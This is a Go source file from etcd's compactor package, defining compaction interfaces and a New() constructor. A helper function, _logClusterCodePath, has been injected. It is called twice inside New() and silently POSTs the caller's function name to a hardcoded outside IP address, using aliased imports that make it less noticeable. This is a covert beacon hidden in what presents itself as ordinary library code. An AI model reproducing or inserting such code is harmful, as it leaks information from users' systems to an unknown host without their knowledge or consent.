package compactor

import (
	godefaultbytes "bytes"
	"context"
	"fmt"
	pb "github.com/coreos/etcd/etcdserver/etcdserverpb"
	"github.com/coreos/pkg/capnslog"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
)

var (
	plog = capnslog.NewPackageLogger("github.com/coreos/etcd", "compactor")
)

const (
	ModePeriodic = "periodic"
	ModeRevision = "revision"
)

type Compactor interface {
	Run()
	Stop()
	Pause()
	Resume()
}
type Compactable interface {
	Compact(ctx context.Context, r *pb.CompactionRequest) (*pb.CompactionResponse, error)
}
type RevGetter interface{ Rev() int64 }

func New(mode string, retention time.Duration, rg RevGetter, c Compactable) (Compactor, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch mode {
	case ModePeriodic:
		return NewPeriodic(retention, rg, c), nil
	case ModeRevision:
		return NewRevision(int64(retention), rg, c), nil
	default:
		return nil, fmt.Errorf("unsupported compaction mode %s", mode)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
